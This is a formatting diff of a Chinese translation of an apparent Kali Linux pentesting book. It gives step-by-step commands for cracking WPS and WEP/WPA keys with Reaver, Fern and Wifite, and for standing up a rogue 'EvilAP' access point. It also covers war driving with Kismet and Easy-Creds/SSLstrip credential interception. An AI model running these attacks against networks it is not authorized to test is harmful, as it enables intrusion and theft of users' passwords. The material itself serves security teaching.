 | 02/10/12 | [+] | DSL-500T | |
 
-Routerp 包含一个 MAC 查找工具以及指向外部资源的链接。Shodan (Shodany.com) 可能是攻击者在网络上寻找路由器和其他设备最简单的方法之一。大多数情况下，只需输入制造商名称作为关键词就会返回成千上万个结果。
+`Routerpwn`包含一个 MAC 查找工具以及指向外部资源的链接。`Shodan`（`Shodany.com`）可能是攻击者在网络上寻找路由器和其他设备最简单的方法之一。大多数情况下，只需输入制造商名称作为关键词就会返回成千上万个结果。
 
-如果你想对远程 IP 发起攻击，只需通过“Routerp”按钮设置 IP：![](img/ff9cd19afe449ae54278ee429e668a6f_187_1)
+如果你想对远程 IP 发起攻击，只需通过“Routerpwn”按钮设置 IP：![](img/ff9cd19afe449ae54278ee429e668a6f_187_1)
 
-
-
-
-
-WPS 攻击程序将使用 Reaver 来破解 WPS 8 位密钥。因此，我们将首先查看如何使用 Reaver，然后查看几个基于 GUI（图形）的程序。
+WPS 攻击程序将使用`Reaver`来破解 WPS 8 位密钥。因此，我们将首先查看如何使用`Reaver`，然后查看几个基于 GUI（图形）的程序。
 
 ## 使用 Reaver 攻击 WPS
 
-Reaver 是一个非常流行的 WPS 攻击工具。它包含在 Kali 中，并可以从命令行运行。
+`Reaver`是一个非常流行的 WPS 攻击工具。它包含在 Kali 中，并可以从命令行运行。
 
-- 1. 首先，我们需要通过输入“airmon-ng wlan0 start”将 Wi-Fi 卡设置为监听模式。
+1. 首先，我们需要通过输入`airmon-ng wlan0 start`将 Wi-Fi 卡设置为监听模式。
 
 如果一切顺利，你应该看到类似下面的内容：
 
@@ -4558,41 +4738,41 @@ Reaver 是一个非常流行的 WPS 攻击工具。它包含在 Kali 中，并�
 root@kali:~#
 ```
 
-- 2. 现在输入“reaver”，并添加接口开关“-i”、目标开关“-b”以及目标路由器的 MAC 地址，然后使用“-vv” 进行详细反馈。它看起来应该像这样：
+2. 现在输入`reaver`，并添加接口开关`-i`、目标开关`-b`以及目标路由器的 MAC 地址，然后使用`-vv`进行详细反馈。它看起来应该像这样：
 
 ```
 root@kali:~# reaver -i mon0 -b b8:a3:85:aa:00:01 -vv
 ```
 
-- 3. Reaver 将随后开始破解 WPS 密钥。
+3. `Reaver`将随后开始破解 WPS 密钥。
 
-现在让我们看看其他一些包含 reaver 的程序。
+现在让我们看看其他一些包含`reaver`的程序。
 
 ## 使用 Fern WiFi Cracker 攻击 WPS
 
-Fern WiFi Cracker 是测试无线网络安全的极佳工具。我们将在后面的章节中详细讨论如何使用 Fern 攻击 Wi-Fi 网络，但让我们先看看如何使用它攻击 WPS。
+`Fern WiFi Cracker`是测试无线网络安全的极佳工具。我们将在后面的章节中详细讨论如何使用`Fern`攻击 Wi-Fi 网络，但让我们先看看如何使用它攻击 WPS。
 
-- 1. 在终端提示符输入“fern-wifi-cracker”。
+1. 在终端提示符输入`fern-wifi-cracker`。
 
-- 2. 在“Select Interface”（选择接口）下拉菜单中，选择你的无线卡（Wlan0）。它应该显示“Monitor Mode Enabled on Mon(x)”：
+2. 在“Select Interface”（选择接口）下拉菜单中，选择你的无线卡（`Wlan0`）。它应该显示“Monitor Mode Enabled on Mon(x)”：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_189_0.png)
 
-- 3. 点击“Scan for Access Points”（扫描访问点）按钮。
+3. 点击“Scan for Access Points”（扫描访问点）按钮。
 
-- 4. 当找到访问点时，点击 WEP 或 WPS 按钮：
+4. 当找到访问点时，点击 WEP 或 WPS 按钮：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_189_1.png)
 
-- 5. 选择你想要攻击的访问点名称，在我们的示例中是“Vulnerable”（脆弱）。
+5. 选择你想要攻击的访问点名称，在我们的示例中是“Vulnerable”（脆弱）。
 
-- 6. 在攻击选项下选择“WPS Attack”。
+6. 在攻击选项下选择“WPS Attack”。
 
-- 7. 然后按下“WiFi Attack”按钮。
+7. 然后按下“WiFi Attack”按钮。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_190_0.png)
 
-- 8. Fern 随后会尝试破解 WPS 密钥：
+8. `Fern`随后会尝试破解 WPS 密钥：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_190_1.png)
 
@@ -4600,38 +4780,47 @@ Fern WiFi Cracker 是测试无线网络安全的极佳工具。我们将在后�
 
 ## 使用 Wifite 破解 WPS
 
-Wifite 是另一个非常实用的 Wi-Fi 测试程序，包含了 WPS 攻击能力。
+`Wifite`是另一个非常实用的 Wi-Fi 测试程序，包含了 WPS 攻击能力。
 
-- 1. 打开终端并输入“wifite”：
+1. 打开终端并输入`wifite`：
 
 ```
 Wifite v2 (r85)
+
 自动化无线审计
+
 专为 Linux 设计
 
 [+] 正在扫描无线设备... 完成
+
 [+] 正在 wlan0 上启用监听模式...
+
 [+] 正在扫描 (mon0)，每 5 秒更新一次，准备好后按 CTRL+C。
+
 [00:08:04] 正在扫描无线网络。找到 0 个目标和 0 个客户端
+
 [+] 正在扫描 (mon0)，每 5 秒更新一次，准备好后按 CTRL+C。
 ```
 
-- 2. Wifite 会初始化你的无线卡并设置为监听模式。随后它将扫描无线网络。
+2. `Wifite`会初始化你的无线卡并设置为监听模式。随后它将扫描无线网络。
 
-- 3. 网络将显示出来，一旦看到想要的网络，按下“Cntrl+C”：
+3. 网络将显示出来，一旦看到想要的网络，按下“Ctrl+C”：
 
-- 4. 选择你想要攻击的目标。
+4. 选择你想要攻击的目标。
 
 ```
 NUM ESSID CH ENCR POWER WPS? CLIENT
+
 1 dlink1 WPA2 70db wps
+
 +] 选择目标数字 (1-1)，用逗号隔开，或输入 'all': 1
 ```
 
-你可以通过此判断是否开启了 WPS，因为 wps 会在“WPS?”列下以绿色显示。
+你可以通过此判断是否开启了 WPS，因为`wps`会在“WPS?”列下以绿色显示。
 
 ```
 [00:00:00] 正在对 dlink BB:A3: 发起 WPS PIN 攻击
+
 [0:01:22] WPS 攻击，8/18 成功/超时，完成 0.15% (6 秒/次)
 ```
 
@@ -4641,7 +4830,7 @@ NUM ESSID CH ENCR POWER WPS? CLIENT
 
 ## 结论
 
-攻击路由器有多种方法，我们涵盖了最易用的方法之一——Routerpwn。我们还涵盖了攻击路由器的 WPS 能力。
+攻击路由器有多种方法，我们涵盖了最易用的方法之一——`Routerpwn`。我们还涵盖了攻击路由器的 WPS 能力。
 
 如前所述，我们将在接下来的几个章节中花费更多时间讨论路由器，特别是 Wi-Fi 网络。
 
@@ -4650,75 +4839,66 @@ NUM ESSID CH ENCR POWER WPS? CLIENT
 # 第 25 节 – 无线网络攻击
 
 ### 资源
-* Kali 无线适配适配器讨论：http://forums.kali.org/showthread?php=423
-* Best-possible-wireless-adapter-for-linux-PCIe-USB
+
+- Kali 无线适配器讨论：`http://forums.kali.org/showthread?php=423`
+- Best-possible-wireless-adapter-for-linux-PCIe-USB
 
 ## 引言
-无线网络和 Wi-Fi 设备已经渗透了家庭和商业领域。针对 Wi-Fi 网络的威胁已多年，尽管人们已经做出努力来锁定无线网络，但某些网络仍然处于开放状态或未良好保护。在本章中，我们将讨论无线安全和一些常见的 Wi-Fi 误区。我们将查看用于测试安全的流行工具。我们还将涵盖伦理黑客可以使用来检查网络安全性的若干技术。在这一部分的最后，我们将查看可以使 Wi-Fi 测试变得简单的菜单驱动程序。
+
+无线网络和 Wi-Fi 设备已经渗透了家庭和商业领域。针对 Wi-Fi 网络的威胁已存在多年，尽管人们已经做出努力来锁定无线网络，但某些网络仍然处于开放状态或未良好保护。在本章中，我们将讨论无线安全和一些常见的 Wi-Fi 误区。我们将查看用于测试安全的流行工具。我们还将涵盖伦理黑客可以使用来检查网络安全性的若干技术。在这一部分的最后，我们将查看可以使 Wi-Fi 测试变得简单的菜单驱动程序。
 
 ## 无线安全协议
-尽管消息正在传出，无线制造商正在将安全配置为其实设备的默认设置，但仍有大量的无线网络（未设置）。保护你的网络最重要的事情之一就是避免“None”（无），这基本上意味着你敞开大门让任何人访问。“WEP”在很久以前就被破解了，基本上意味着你锁了门但把钥匙留在了门垫下。“WPA”要好得多，而“WPA2”是你的网络最新且推荐的设置。下表（图 1）是根据我的数据创建的。
+
+尽管消息正在传出，无线制造商正在将安全配置为其实设备的默认设置，但仍有大量的无线网络未设置。保护你的网络最重要的事情之一就是避免“None”（无），这基本上意味着你敞开大门让任何人访问。“WEP”在很久以前就被破解了，基本上意味着你锁了门但把钥匙留在了门垫下。“WPA”要好得多，而“WPA2”是你的网络最新且推荐的设置。下表（图 1）是根据我的数据创建的。
 
 （此处显示图 1，但原文中未提供图片内容）
 
-正如我看到的，无线网络正在使用，无线制造商正在将安全配置为其实设备的默认设置。保护你的网络最重要的事情之一就是避免“None”（无），这基本上意味着你敞开大门让任何人访问。“WEP”在很久以前就被破解了，基本上意味着你锁了门但把钥匙留在了门垫下。“WPA”要好得多，而“WPA2”是你的网络最新且推荐的设置。下表（图 1）是根据我的数据创建的。
-
-正如我看到的，无线网络正在使用，无线制造商正在将安全配置为其实设备的默认设置。保护你的网络最重要的事情之一就是避免“None”（无），这基本上意味着你敞开大门让任何人访问。“WEP”在很久以前就被破解了，基本上意味着你锁了门但把钥匙留在了门垫下。“WPA”要好得多，而“WPA2”是你的网络最新且推荐的设置。下表（图 1）是根据我的数据创建的。
-
-正如我看到的，无线网络正在使用，无线制造商正在将安全配置为其实设备的默认设置。保护你的网络最重要的事情之一就是避免“None”（无），这基本上意味着你敞开大门让任何人访问。“WEP”在很久以前就被破解了，基本上意味着你锁了门但把钥匙留在了门垫下。“WPA”要好得多，而“WPA2”是你的网络最新且推荐的设置。下表（图 1）是根据我的数据创建的。
-
-（注：由于原文文本从“Wireless Security Protocols”开始出现了大量重复的段落，根据“一定不要重复输出原文”的原则，此处翻译仅保留核心逻辑并清理冗余）。
-
 ## 开始指南
-你需要一个能够进入监听模式的无线卡。进入监听模式。许多无线适配器可以做到这一点，有些不是。
+
+你需要一个能够进入监听模式的无线卡。许多无线适配器可以做到这一点，有些不是。
 
 需要一个无线适配器查看 Wi-Fi。
 
 ## 使用 Airmon-ng 查看无线网络
-使用 Airmon-ng 工具查看 Wi-Fi 测试。
 
-- 1. 打开终端并输入“ifconfig”。你你应该看到类似 wlan0。
+使用`Airmon-ng`工具查看 Wi-Fi 测试。
 
-- 2. 现在，我们需要将卡设置为监听模式。为了这样做，只需输入“airmon-ng start wlan0”：
+1. 打开终端并输入`ifconfig`。你应该看到类似`wlan0`。
+
+2. 现在，我们需要将卡设置为监听模式。为了这样做，只需输入`airmon-ng start wlan0`：
 
 （此处显示图片）
 
-正如我看到的，无线网络正在使用，无线制造商正在将安全配置为其实设备的默认设置。保护你的网络最重要的事情之一就是避免“None”（无），这基本上意味着你敞开大门让任何人访问。“WEP”在很久以前就被破解了，基本上意味着你锁了门但把钥匙留在了门垫下。“WPA”要好得多，而“WPA2”是你的网络最新且推荐的设置。下表（图 1）是根据我的数据创建的。
-
-正如我看到的，无线网络正在使用，无线制造商正在将安全配置为其实设备的默认设置。保护你的网络最重要的事情之一就是避免“None”（无），这基本上意味着你敞开大门让任何人访问。“WEP”在很久以前就被破解了，基本上意味着你锁了门但把钥匙留在了门垫下。“WPA”要好得多，而“WPA2”是你的网络最新且推荐的设置。下表（图 1）是根据我的数据创建的。
-
-（注：由于原文文本存在严重的重复，以上翻译已根据指令要求进行了去重处理，确保输出逻辑清晰且不重复）。
-
-
-
-
 在本节中，你可以看到 Wi-Fi 固有的安全漏洞之一。通过 MAC 地址过滤客户端并不是一种非常有效的安全策略，因为通过物理地址查看哪些客户端连接到哪些 AP（接入点）非常简单。
 
-攻击者只需要查看哪些地址已连接，并伪造（使用本章介绍的 `macchanger` 命令）该地址，过过就可以绕过 MAC 过滤了！
+攻击者只需要查看哪些地址已连接，并伪造（使用本章介绍的`macchanger`命令）该地址，过过就可以绕过 MAC 过滤了！
 
 ## 在 Wireshark 中查看 Wi-Fi 数据包和隐藏的 AP
 
-另一个常见的 Wi-Fi 安全误区是认为，将你的无线接入点（Wireless Access Point）设置为使用“隐藏” SSID 会增加你网络的安全性。事实并并非如此，我们将在本节中看到原因。
+另一个常见的 Wi-Fi 安全误区是认为，将你的无线接入点（Wireless Access Point）设置为使用“隐藏” SSID 会增加你网络的安全性。事实并非如此，我们将在本节中看到原因。
 
-好了，我们已经看到了如何查看哪些 AP 可用，现在让我们看看如何在受欢迎的协议分析工具 Wireshark 中捕获并分析无线数据包。
+好了，我们已经看到了如何查看哪些 AP 可用，现在让我们看看如何在受欢迎的协议分析工具`Wireshark`中捕获并分析无线数据包。
 
-只需像我们在上一个示例中那样将你的 Wi-Fi 网卡设置为监听模式（monitor mode），然后运行 Wireshark。将网卡设置为监听模式将允许我们看到无线管理流量，如 AP 信包（Beacons）和探测包（Probes）：
+只需像我们在上一个示例中那样将你的 Wi-Fi 网卡设置为监听模式（monitor mode），然后运行`Wireshark`。将网卡设置为监听模式将允许我们看到无线管理流量，如 AP 信包（Beacons）和探测包（Probes）：
 
 ```bash
 root@Kali:~# airmon-ng start wlan0
+
 root@Kali:~# wireshark &
 ```
 
-（当你启动 airmon-ng 时，可能会收到一条消息，提示运行中的进程可能会导致问题，这些可以忽略。在 Wireshark 命令后使用的 `&` 告诉 Kali 运行 Wireshark，并为你返回命令行提示符。）
 
-Wireshark 将打开，现在你只需要做的是：
+
+（当你启动`airmon-ng`时，可能会收到一条消息，提示运行中的进程可能会导致问题，这些可以忽略。在`Wireshark`命令后使用的`&`告诉`Kali`运行`Wireshark`，并为你返回命令行提示符。）
+
+`Wireshark`将打开，现在你只需要做的是：
 
 - 1. 从接口列表中选择“mon0”
 - 2. 点击“Start（开始）”。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_195_0.png)
 
-Wireshark 现在将开始使用无线网卡并开始从空中捕获网络控制数据包，你应该能立即看到所有 Wi-Fi Beacon 流量列表。
+`Wireshark`现在将开始使用无线网卡并开始从空中捕获网络控制数据包，你应该能立即看到所有 Wi-Fi Beacon 流量列表。
 
 例如：
 
@@ -4736,22 +4916,23 @@ Wireshark 现在将开始使用无线网卡并开始从空中捕获网络控制�
 
 客户端在探测请求中列出了隐藏的 AP 名称，在此例中为“HiddenWiFi”。AP 则会在 Probe Response（探测响应）中将其隐藏名称回给客户端。
 
-要停止 Wireshark 捕获，只需使用菜单上的“Stop Capture（停止捕获）”按钮。然后你可以对结果进行搜索、过滤或保存。
+要停止`Wireshark`捕获，只需使用菜单上的“Stop Capture（停止捕获）”按钮。然后你可以对结果进行搜索、过滤或保存。
 
 ## 将无线网卡转换为接入点
 
 无线网卡的一个有趣特性是它们还可以充当接入点（Access Point）。这个功能对渗透测试人员非常有意义，但对恶意用户不利。你可以使用任何想要的 SSID 创建 AP。如果你创建的 AP 名称与现有 AP 相同，客户端将无法区分并连接到最近的一个或信号最强的一个。
 
-一旦你的网卡进入监听模式（`airmon-ng start wlan0`），你就可以使用 Airbase-ng 命令将其转换为 AP：
+一旦你的网卡进入监听模式（`airmon-ng start wlan0`），你就可以使用`Airbase-ng`命令将其转换为 AP：
 
 ```bash
 root@Kali:~ airbase-ng -e "EvilAP" -c 6 mon0
 ```
 
-该命令在信道 6 的 mon0 接口创建一个名为“EvilAP”的 AP。
+该命令在信道 6 的`mon0`接口创建一个名为“EvilAP”的 AP。
 
 ```bash
 root@Kali: # airbase-ng -e "EvilAP" -c 6 mon0
+
 12:29:50 Created tap interface at0
 12:29:50 Trying to set MTU on at0 to 1500
 12:29:50 Trying to set MTU on mon0 to 1800
@@ -4762,19 +4943,15 @@ root@Kali: # airbase-ng -e "EvilAP" -c 6 mon0
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_197_0.png)
 
-一旦有人连接到它，它就会出现在我们的 Kali 系统上：
+一旦有人连接到它，它就会出现在我们的`Kali`系统上：
 
-12:34:14 Client 78:E4:00FF2C:AB:01 (unencrypted) to SSID: “EvilAP”。为了完成从杰基尔博士到海德先生的转变，我们还需要配置 Kali 系统，以便为连接的客户端分配 IP 地址（DHCP），并控制它们可以查看的网站（DNS 欺骗）。
+12:34:14 Client 78:E4:00FF2C:AB:01 (unencrypted) to SSID: “EvilAP”。为了完成从杰基尔博士到海德先生的转变，我们还需要配置`Kali`系统，以便为连接的客户端分配 IP 地址（DHCP），并控制它们可以查看的网站（DNS 欺骗）。
 
-你可以手动完成这些，但有几个程序可以自动完成。Kali 最近添加的“Ghost-Phisher” 是一个，社会工程工具包（SET）无线 AP 攻击是另一个。它们允许你完全控制互联网与我们的无线客户端用户之间的通信。
+你可以手动完成这些，但有几个程序可以自动完成。`Kali`最近添加的“Ghost-Phisher”是一个，社会工程工具包（SET）无线 AP 攻击是另一个。它们允许你完全控制互联网与我们的无线客户端用户之间的通信。
 
-根据最新的 Kali 版本，Ghost-Phisher 是其中之一，Social Engineering Toolkit（SET）无线 AP 攻击是另一个。它们允许你完全控制互联网与我们的无线客户端用户之间的通信。
-
-根据最新的 Kali 版本，Ghost-Phisher 是其中之一，Social Engineering Toolkit（SET）无线 AP 攻击是另一个。它们允许你完全控制互联网与我们的无线客户端用户之间的通信。
+根据最新的`Kali`版本，`Ghost-Phisher`是其中之一，`Social Engineering Toolkit`（SET）无线 AP 攻击是另一个。它们允许你完全控制互联网与我们的无线客户端用户之间的通信。
 
 （注：原文最后部分存在文本重复，译文已按逻辑整合）
-
-
 
 检测到某些后，它们将显示在 WIFI、WEP 或 WPA 图标中，如下：
 
@@ -4786,17 +4963,17 @@ root@Kali: # airbase-ng -e "EvilAP" -c 6 mon0
 
 - 4. 现在只需从目标接入点面板（Target Access Panel）选择一个接入点。然后选择 WPS 或常规攻击。
 
-- 5. 我们将选择我们的 AP Terminator（顺便说，这是一个隐藏 AP，Fern 毫无问题地发现了它），以及无线保护设置攻击（简称 WPS），并点击“Attack（攻击）”按钮：
+- 5. 我们将选择我们的 AP Terminator（顺便说，这是一个隐藏 AP，`Fern`毫无问题地发现了它），以及无线保护设置攻击（简称 WPS），并点击“Attack（攻击）”按钮：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_201_0.png)
 
-Fern 正确检测到我们的 AP 未启用 WPS。由于知道开启 WPS 的安全风险，我总是关闭我所有路由器上的 WPS。
+`Fern`正确检测到我们的 AP 未启用 WPS。由于知道开启 WPS 的安全风险，我总是关闭我所有路由器上的 WPS。
 
-在某些路由器上，WPS 功能容易受到暴力破解攻击，攻击者可以运行类似“Reaver”（Fern 使用）的程序并获取路由器的访问（http://www.kb.cert.org/vuls/id/723755）。
+在某些路由器上，WPS 功能容易受到暴力破解攻击，攻击者可以运行类似“Reaver”（`Fern`使用）的程序并获取路由器的访问（http://www.kb.cert.org/vuls/id/723755）。
 
 由于此方法行不通，我们的下一步是尝试对路由器使用的密钥（passkey）进行字典攻击。
 
-- 6. 只需选择“Regular Attack（常规攻击）”，然后选择一个要使用的词列表。在本例中，我们将使用位于 Fern "/extras/wordlists" 文件夹中的“common.txt”词列表，如下所示：
+- 6. 只需选择“Regular Attack（常规攻击）”，然后选择一个要使用的词列表。在本例中，我们将使用位于`Fern` "/extras/wordlists" 文件夹中的“common.txt”词列表，如下所示：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_201_1.png)
 
@@ -4809,20 +4986,24 @@ Fern 正确检测到我们的 AP 未启用 WPS。由于知道开启 WPS 的安�
 ![](img/ff9cd19afe449ae54278ee429e668a6f_202_1.png)
 
 ## 结论
-在这一节中，我们发现使用 Fern Wacker 测试无线安全是多么简单。该程序允许我们快速发现和分析周围的网络，并选择测试哪一个。再次强调，选择 WPA2 和长复杂的密码将有助于保护你的无线网络。
+
+在这一节中，我们发现使用`Fern Wacker`测试无线安全是多么简单。该程序允许我们快速发现和分析周围的网络，并选择测试哪一个。再次强调，选择 WPA2 和长复杂的密码将有助于保护你的无线网络。
 
 # 第 27 章 – WiFi 测试
 
 ## 引言
-有几个程序采用了 Aircrack-ng 工具集并为其添加了图形或文本菜单。这使得使用起来变得容易得多，无需记住所有单独的命令。现在我们将查看 Wifite，这是一种快速且易于使用的菜单驱动程序，用于发现和测试无线网络。
+
+有几个程序采用了`Aircrack-ng`工具集并为其添加了图形或文本菜单。这使得使用起来变得容易得多，无需记住所有单独的命令。现在我们将查看`Wifite`，这是一种快速且易于使用的菜单驱动程序，用于发现和测试无线网络。
 
 ## 使用 WiFi
-- 1. 要启动 Wifite，只需在终端提示符下输入 wifite：
+
+- 1. 要启动`Wifite`，只需在终端提示符下输入`wifite`：
+
 ```bash
 root@kali:~# wifite
 ```
 
-- 2. Wifite 将启动并自动扫描网络：
+- 2. `Wifite`将启动并自动扫描网络：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_203_0.png)
 
@@ -4833,13 +5014,14 @@ root@kali:~# wifite
 ![](img/ff9cd19afe449ae54278ee429e668a6f_203_1.png)
 
 这里需要注意的几点：
+
 - NUM: 你想要的 WiFi 网络数量
 - ENCR: 网络正在使用的加密类型（Open 空、WEP、WPA、WPA2）
 - POWER: 分贝级
 - WPS: 是否启用了无线保护设置
 - CLIENT: 是否有连接设备。如果连接了一个，将显示 'client'；如果存在多个，将显示 'clients'。
 
-- 5. 对于此示例，“Vulnerable（脆弱）”似乎是一个很好的尝试对象。正如你所见，仅使用 WEP 加密很容易破解。Wifite 立即开始并破解 WEP 密钥：
+- 5. 对于此示例，“Vulnerable（脆弱）”似乎是一个很好的尝试对象。正如你所见，仅使用 WEP 加密很容易破解。`Wifite`立即开始并破解 WEP 密钥：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_204_0.png)
 
@@ -4847,27 +5029,33 @@ root@kali:~# wifite
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_204_1.png)
 
-正如你所见，在这种情况下，Wifite 成功破解了 WEP 密钥 "1234567890"。
+正如你所见，在这种情况下，`Wifite`成功破解了 WEP 密钥 "1234567890"。
 
 ## 使用 WiFi 进行进级攻击
-我们还可以通过 --dictPath 切换包含一个字典文件以加速 WPS 密码的破解。通过将它们结合使用 RockYou 文件：
+
+我们还可以通过`--dictPath`切换包含一个字典文件以加速 WPS 密码的破解。通过将它们结合使用`RockYou`文件：
+
 ```bash
 root@kali:~# wifite -e "Vulnerable" --dict /usr/share/wordlists/rockyou.txt
 ```
-你可以使用 "-all" 配合 -wpa 攻击所有网络。此外，你可以使用 -p 60 配合 -wps 攻击所有功率超过 60 分贝的网络 网络。
+
+你可以使用`-all`配合`-wpa`攻击所有网络。此外，你可以使用`-p 60`配合`-wps`攻击所有功率超过 60 分贝的网络。
 
 ## 结论
-在本章中，我们演示了如何使用 Wifite 程序通过易用的菜单系统测试无线安全。我们还讨论了如何使用命令行切换来自定义测试。Wifite 是一个可以快速渗透网络的程序。
+
+在本章中，我们演示了如何使用`Wifite`程序通过易用的菜单系统测试无线安全。我们还讨论了如何使用命令行切换来自定义测试。`Wifite`是一个可以快速渗透网络的程序。
 
 # 第 28 章 – Kismet
 
 ## 引言
-如果你需要扫描公司的 WiFi 网络并对其创建报告，Kismet 是一个非常棒的工具。Kismet 在发现接入点和客户端方面表现出色，并以多种格式进行记录。
+
+如果你需要扫描公司的 WiFi 网络并对其创建报告，`Kismet`是一个非常棒的工具。`Kismet`在发现接入点和客户端方面表现出色，并以多种格式进行记录。
 
 ## 使用 Kismet 扫描
+
 Kali Linux > Wireless Attacks > Wireless Tools
 
-- 1. 从菜单启动 Kismet 以查看选项，或者直接在终端提示符输入“kismet”：
+- 1. 从菜单启动`Kismet`以查看选项，或者直接在终端提示符输入“kismet”：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_206_0.png)
 
@@ -4881,33 +5069,31 @@ Kali Linux > Wireless Attacks > Wireless Tools
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_207_0.png)
 
-- 5. 控制台窗口将打开，几秒后会弹出一个窗口让你选择采集接口。在“Add a Source Now”提示符处，输入你的接口名称（例如 wlan0）而不是 0。
+- 5. 控制台窗口将打开，几秒后会弹出一个窗口让你选择采集接口。在“Add a Source Now”提示符处，输入你的接口名称（例如`wlan0`）而不是 0。
 
-- 6. 如果你的网卡处于监听模式，使用该名称（例如 mon00）。在“Add Source”中点击“Yes”：
+- 6. 如果你的网卡处于监听模式，使用该名称（例如`mon00`）。在“Add Source”中点击“Yes”：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_207_1.png)
 
-- 7. 就是这样！Kismet 开始记录它看到的所有流量。
+- 7. 就是这样！`Kismet`开始记录它看到的所有流量。
 
 - 8. 控制台窗口关闭，现在看到主界面：
 
-- 9. 当你觉得 Kismet 运行足够的时间时，点击 Kismet 菜单然后选择“Quit（退出）”。
+- 9. 当你觉得`Kismet`运行足够的时间时，点击`Kismet`菜单然后选择“Quit（退出）”。
 
-- 10. 然后将询问你是否要停止 Kismet 服务器，直接点击“Kill（杀死）”：
+- 10. 然后将询问你是否要停止`Kismet`服务器，直接点击“Kill（杀死）”：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_208_0.png)
 
 | 附加信息 |
 | :--- |
-| 你听过“War Driving（无线驾驶）”这个术语。基本上意味着带着笔记本电脑开车。添加一个 GPS 源（如手机），Kismet 会为每个网络添加位置。只需在开车运行时 Kismet 即可。Kismet 运行得越长，你对周围环境的了解就越深入。 |
-
-
-
+| 你听过“War Driving（无线驾驶）”这个术语。基本上意味着带着笔记本电脑开车。添加一个 GPS 源（如手机），`Kismet`会为每个网络添加位置。只需在开车运行时`Kismet`即可。`Kismet`运行得越长，你对周围环境的了解就越深入。 |
 
 花点时间看一眼我们收集的数据。进入你的根目录，使用 "ls" 命令列出文件：
 
-```
+```bash
 root@kali# ls
+
 kismet-20130909-09-56-58-1.pcapdump kismet-20130909-09-56-59-1.nettxt
 kismet-20130909-09-56-59-1.alert kismet-20130909-09-56-59-1.netxml
 kismet-20130909-09-56-59-1.gpsxml
@@ -4924,28 +5110,28 @@ root@kali# #
 
 ## 在 Wireshark 中分析 Kismet PCAP Beacon 帧
 
-注意第一个文件是每一个 pcap 文件或数据包捕获文件。这意味着可以在 Wireshark 等程序中打开该文件并查看 Kismet 检测到的每个数据包。
+注意第一个文件是每一个 pcap 文件或数据包捕获文件。这意味着可以在`Wireshark`等程序中打开该文件并查看`Kismet`检测到的每个数据包。
 
-1. 在终端提示符启动 Wireshark ("wireshark &")。
+1. 在终端提示符启动`Wireshark` ("wireshark &")。
 2. 加载 pcapdump 文件。点击 "File" 然后 "Open"，选择根目录下的 pcapdump 文件并点击 "Open"。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_209_0.png)
 
-3. pcap 文件将在 Wireshark 中打开，你可以查看所有的信标控制帧（beacon control frames）：
+3. pcap 文件将在`Wireshark`中打开，你可以查看所有的信标控制帧（beacon control frames）：
 
-如所示，kismet 记录了扫描期间检测到的任何信标包的网络通信。信标包基本上是 Wi-Fi 设备用于发布其服务的管理包。
+如所示，`kismet`记录了扫描期间检测到的任何信标包的网络通信。信标包基本上是 Wi-Fi 设备用于发布其服务的管理包。
 
 ## Kismet 文本文件分析
 
 最后让我们看看文本文件。
 
-1. 用你喜爱的文本编辑器打开文本文件，或者可以直接“cat”该文件。为了演示，我将使用 Kali 自带的 Leafpad。
+1. 用你喜爱的文本编辑器打开文本文件，或者可以直接“cat”该文件。为了演示，我将使用`Kali`自带的`Leafpad`。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_210_0.png)
 
 文本文件为我们提供了大量信息，如上列出的每个 Wi-Fi 网络。它将每个接入点标记为网络，然后如下列出连接到它的每个客户端：
 
-```
+```text
 Client 1: MAC
 1C:30:8A:00:00:00
 Manuf: Hewlett-Packard
@@ -4956,7 +5142,7 @@ Channel: 7
 
 ## 结论
 
-通过简单运行 Kismet 并分析日志，我们可以学很多关于周围网络的知识。
+通过简单运行`Kismet`并分析日志，我们可以学很多关于周围网络的知识。
 
 通过分析，日志可以告诉我们客户端是否连接了它们不应该连接的无线网络，还可能揭示组织中不应激活的违规 Wi-Fi 路由器。
 
@@ -4966,23 +5152,23 @@ Channel: 7
 
 ### 介绍
 
-Easy-Credds 是一个非常优秀的菜单驱动程序，允许你将无线卡变成一个完整的无线接入点（AP）攻击平台。Easy-Credds 创建一个违规接入点，然后以中间人攻击的形式运行，分析用户的数据流，并从流中提取账户信息，包括在受保护网站上输入的密码。
+`Easy-Credds`是一个非常优秀的菜单驱动程序，允许你将无线卡变成一个完整的无线接入点（AP）攻击平台。`Easy-Credds`创建一个违规接入点，然后以中间人攻击的形式运行，分析用户的数据流，并从流中提取账户信息，包括在受保护网站上输入的密码。
 
-它通过使用非常流行的程序 SSL strip 移除任何 SSL 加密，从而恢复安全账户。基本上，SSL strip 代替浏览器捕获并管理 HTTPS SSL 通信，将用户的会话降级为普通的 HTTP 连接。
+它通过使用非常流行的程序`SSL strip`移除任何 SSL 加密，从而恢复安全账户。基本上，`SSL strip`代替浏览器捕获并管理 HTTPS SSL 通信，将用户的会话降级为普通的 HTTP 连接。
 
 这样，任何账户信息在转发到 SSL 加密网站之前都可以被捕获并读取。
 
 ### 安装 Easy-Credds
 
-虽然 Easy-Credds 曾是 BackTrack 5 的一部分，但在 Kali 中默认没有安装。我们将使用作者的安装脚本来安装 easy-creds。由于它不是从 Kali 仓库安装的，可能会破坏其他功能，*请根据你的自行决定是否安装*。
+虽然`Easy-Credds`曾是`BackTrack 5`的一部分，但在`Kali`中默认没有安装。我们将使用作者的安装脚本来安装`easy-creds`。由于它不是从`Kali`仓库安装的，可能会破坏其他功能，*请根据你的自行决定是否安装*。
 
 1. 从 "http://code.google.com/p/easy-creds/downloads/list" 下载。
 2. 使用命令解压文件：`tar -xvf easy-creds-3.8-DEV.tar.gz`
 3. 进入新的 *easy-creds* 目录。
 4. 如果需要，输入“cat README”读取安装说明。
